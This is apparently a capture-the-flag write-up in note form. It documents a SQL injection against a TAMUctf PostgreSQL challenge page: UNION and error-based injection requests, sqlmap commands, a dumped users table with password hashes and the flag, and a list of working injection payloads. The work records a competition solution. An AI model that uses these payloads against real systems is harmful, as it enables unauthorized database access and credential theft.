@@ -1,0 +1,155 @@
+GET /problem/49166/?name=Cone'+or+1%3d1--+-
+
+
+GET /problem/49166/?name=Cone'+order+by+6--+-
+	pq: ORDER BY position 6 is not in select list
+
+GET /problem/49166/?name=Cone'+union+select+1,2,3,4,5--+-
+	pq: UNION types character varying and integer cannot be matched
+
+GET /problem/49166/?name=Cone'+union+select+null,null,null,null,null--+-
+	OK
+GET /problem/49166/?name=Cone'+union+select+1,null,null,null,null--+-
+	OK
+...
+GET /problem/49166/?name=Cone'+union+select+1,'a',null,'a','a'--+-
+	OK
+
+GET /problem/49166/?name=Cone'+union+select+1,'a','a','a','a'--+-
+	pq: invalid input value for enum contlevel: "a"
+
+
+GET /problem/50216/?name=Cone'+union+select+1,'a','neutralized','a','a'--+-
+	<h3 class="card-title">Codename : a</h3>
+    <div class="card-text">ID : 1</div>
+    <div class="card-text">SCP Containment : neutralized</div>
+    <div class="card-text">b</div>
+
+
+GET /problem/50216/?name=Cone'+union+select+1,version(),'neutralized','b','c'--+-
+	PostgreSQL 11.11 (Debian 11.11-0&#43;deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
+
+
+current_database()
+	scpfoundation
+
+
+Error-based is easier to get multiple columns
+
+Get tables, error-based
+	https://shell.tamuctf.com/problem/50216/?name=Cone' union select '1', '2', 'safe',(CASE WHEN ((SELECT CAST(CHR(32)||(SELECT query_to_xml('select table_name FROM information_schema.tables',true,true,'')) AS NUMERIC)='1')) THEN 'a' ELSE 'b' END),'5
+
+	=> Too much results
+
+Dump Current DB, error-based
+
+	https://shell.tamuctf.com/problem/50216/?name=Cone' union select '1', '2', 'safe',(CASE WHEN ((SELECT CAST(CHR(32)||(SELECT database_to_xml(true,true,'')) AS NUMERIC)='1')) THEN 'a' ELSE 'b' END),'5
+
+
+Output
+```
+pq: invalid input syntax for type numeric: " <scpfoundation xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+
+<public>
+
+<experiments>
+  <id>1</id>
+  <codename>Default</codename>
+  <containment>safe</containment>
+  <description>default testing icon</description>
+  <img>avatar</img>
+</experiments>
+
+<experiments>
+  <id>2</id>
+  <codename>Teddy</codename>
+  <containment>euclid</containment>
+  <description>To please the teddy, one must offer them a sacrifice of your finest tea</description>
+  <img>teddy</img>
+</experiments>
+
+<experiments>
+  <id>3</id>
+  <codename>Traffic Cone #88192</codename>
+  <containment>neutralized</containment>
+  <description>We believe they appear from interdimensional rifts with no clear origin</description>
+  <img>cone</img>
+</experiments>
+
+<experiments>
+  <id>4</id>
+  <codename>Gnomial</codename>
+  <containment>thaumiel</containment>
+  <description>If encountered in the wild do not make eye contact. They only become more aggressive.</description>
+  <img>gnome</img>
+</experiments>
+
+...
+
+<users>
+  <id>1</id>
+  <name>glenn</name>
+  <password>9651cbc7c0b5fb1a81f2858a07813c82</password>
+  <status>Making More Challenges</status>
+</users>
+
+<users>
+  <id>2</id>
+  <name>teddy</name>
+  <password>e2ec2b31abe380b989ff057aef66377a</password>
+  <status>PWNing Away</status>
+</users>
+
+<users>
+  <id>3</id>
+  <name>admin</name>
+  <password>gigem{SQL_1nj3ct1ons_c4n_b3_fun}</password>
+  <status>Away on Vacation</status>
+</users>
+
+
+</public>
+
+</scpfoundation>
+```
+
+
+
+
+=================== SQLMap ===================
+sqlmap -r req.txt -p name --batch
+	PostgreSQL
+sqlmap -r req.txt -p name --batch --current-db
+	public
+
+sqlmap -r req.txt -p name --batch -D public --tables
+	experiments
+	users
+
+sqlmap -r req.txt -p name --batch -D public -T users --dump
+	id | name  | status                 | password
+	1  | glenn | Making More Challenges | 9651cbc7c0b5fb1a81f2858a07813c82
+	2  | teddy | PWNing Away            | e2ec2b31abe380b989ff057aef66377a
+	3  | admin | Away on Vacation       | gigem{SQL_1nj3ct1ons_c4n_b3_fun}
+
+
+
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=Cone%' AND 4246=4246 AND '%'='
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: name=Cone%' AND 2703=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2703=2703) THEN 1 EL
+SE 0 END))::text||(CHR(113)||CHR(113)||CHR(98)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: name=Cone%';SELECT PG_SLEEP(5)--
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: name=Cone%' AND 1320=(SELECT 1320 FROM PG_SLEEP(5)) AND '%'='
+---
